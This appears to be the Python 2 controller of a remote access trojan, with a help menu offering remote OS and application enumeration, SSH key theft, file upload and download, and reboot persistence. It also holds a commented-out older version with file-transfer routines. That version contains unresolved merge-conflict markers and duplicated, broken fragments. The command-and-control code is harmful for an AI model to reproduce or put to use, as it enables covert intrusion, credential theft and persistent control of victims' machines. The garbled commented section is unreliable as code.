import logging
import os
import socket
import sys

class CrispyController:  
    def __init__(self, host, port, cipher):
        self.host = host
        self.port = port
        self.cipher = cipher
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def help_menu(self):
        info = """
        Remote commands:
            enum_os            - get operating system info
            enum_applications  - get a list of installed applications
            enum_drives        - get a list of drives
            enum_printers      - get a list of printers
            get_ssh_keys       - get any ssh keys
            download           - download [src absolute path] [dest absolute path]
            upload             - upload [src absolute path] [dest absolute path]
            enable_persistence - make py persistent through reboots
        Local commands:
            session            - show info about current session
            exit               - close down connection to remote host
        """
        return info

    def run(self):
        from constants import BANNER, BUFFER_SIZE
        
        try:
            self.sock.connect((self.host, self.port))
            print BANNER
            
            while True:
                cmd = raw_input("%s:%i>> " % (self.host, self.port)).strip()
                 
                if cmd == '-h' or cmd == 'help':
                    print self.help_menu()
                elif cmd == 'session':
                    pass
                elif cmd == 'exit' or cmd == 'quit':
                    self.sock.close()
                    sys.exit(0)
                else:
                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
                    data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
                    print data
        except Exception as e:
            print "[!] Controller run() --> {0}".format(e)
        finally:
            sys.exit(0)

# import os
# import socket
# import sys
# 
# from .encoders.mime import Mime
# from .constants import *
# 
# TCP_IP, TCP_PORT = "localhost", 8080
# PROMPT = "%s:%i>> " % (TCP_IP, TCP_PORT)
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# cipher = Mime()
#     
# def help_menu():
#     info = """
#     Remote commands:
#         enum_os            - get operating system info
#         enum_applications  - get a list of installed applications
#         enum_drives        - get a list of drives
#         enum_printers      - get a list of printers
#         get_ssh_keys       - get any ssh keys
#         download           - download [src absolute path] [dest absolute path]
#         upload             - upload [src absolute path] [dest absolute path]
#         enable_persistence - make py persistent through reboots
#     Local commands:
#         session            - show info about current session
#         exit               - close down connection to remote host
#     """
#      
#     return info
# 
# def receiveFile(downFile):
#     if os.path.isfile(downFile):
#         return False 
#     else:   
#         try:
#             with open(downFile, 'wb') as f:
#                 receiving = True
#                 while receiving:
#                     data = sock.recv(BUFFER_SIZE)
#                     print data
#                     if "EOF!EOF!" in data:
#                         data = data[:-8]
#                         receiving = False
#                     data = cipher.decode(data)
#                      
#                     if not data:
#                         break
#                     elif "EOF!EOF!" in data: 
#                         f.write(data[:-8])
#                         receiving = False
#                     else:
#                         f.write(data)
#             return True
#         except IOError: 
#             return False
#  
# def uploadFile(upFile):
#     try:
#         with open(upFile, 'rb') as f:
#             while True:
#                 data = f.read(BUFFER_SIZE)
# 
#                 if not data:
#                     break
#                 else:
#                     sock.sendall(cipher.encode(data))        
#         sock.sendall(cipher.encode("EOF!EOF!"))
#         #have client send a 'complete' message back before we return True
#         return True
#     except IOError:
#         return False
# 
# def spawn():
#     try:
#         sock.connect((TCP_IP, TCP_PORT))
#         print BANNER
#         
#         while True:
#             cmd = raw_input(PROMPT).strip()
#              
#             if cmd == '-h' or cmd == 'help':
#                 print help_menu()
#             elif cmd == 'session':
#                 print get_session_info()
#             elif cmd.startswith('download'):
#                 print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
#                 sock.sendall(cipher.encode(cmd + "\n"))
#                 
#                 if receiveFile(cmd[9:].split(' ')[1]):
#                     print "[+] File transfer complete!\n"
#                 else:
#                     print "[!] File transfer failed.\n"
#             elif cmd.startswith('upload'): #do I need to md5 the file before and after to determine success?
#                 sendMeFile = cmd[7:].split(' ')[0]
#                 print "[+] Uploading " + sendMeFile + "..."
#                 
#                 sock.sendall(cipher.encode(cmd + "\n"))
#                 
#                 if uploadFile(sendMeFile):
#                     print "[+] File transfer complete!\n"
#                 else:
#                     print "[!] File transfer failed.\n"
#             elif cmd == 'exit' or cmd == 'quit':
#                 sock.shutdown('SHUT_WR') #does this need to be encoded?
#                 sock.close()
#                 break
#             else:
# <<<<<<< Updated upstream
#                 sock.sendall(cipher.encode(cmd + "\n"))
#                 data = cipher.decode(sock.recv(BUFFER_SIZE))
#                 print data
#     except Exception as e:
#         print e
#         print "Couldn't connect to " + TCP_IP
#     finally:
#         sys.exit(0)
# =======
#                 print "[!] File transfer failed.\n"
#         elif cmd == 'exit' or cmd == 'quit':
#             sock.shutdown('SHUT_WR') #does this need to be encoded?
#             sock.close()
#             break
#         else:
#             sock.sendall(cipher.encode(cmd + "\n"))
#             data = cipher.decode(sock.recv(BUFFER_SIZE))
#             print data
# except:
#     print "Couldn't connect to " + TCP_IP
# finally:
#     sock.close()
